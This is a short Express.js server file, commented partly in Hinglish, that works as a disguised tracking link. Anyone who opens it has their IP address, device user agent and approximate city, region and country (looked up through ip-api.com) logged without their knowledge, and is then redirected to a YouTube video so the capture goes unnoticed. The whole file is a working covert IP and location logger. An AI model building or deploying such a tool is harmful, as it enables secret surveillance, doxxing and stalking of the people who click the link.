const express = require('express');
const app = express();

const TARGET_URL = 'https://youtu.be/e3xcr35mVvQ?si=M0WGqN64nWtWiTZT';

app.get('/', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toISOString();

    try {
        // Free IP API ka use karke location nikalna
        const response = await fetch(`http://ip-api.com/json/${ip.split(',')[0]}`);
        const data = await response.json();
        
        console.log(`CLICK_LOG => Time: ${timestamp} | IP: ${ip} | Location: ${data.city}, ${data.regionName}, ${data.country} | Device: ${userAgent}`);
    } catch (error) {
        console.log(`CLICK_LOG => Time: ${timestamp} | IP: ${ip} | Location: Error fetching | Device: ${userAgent}`);
    }

    res.redirect(TARGET_URL);
});

module.exports = app;
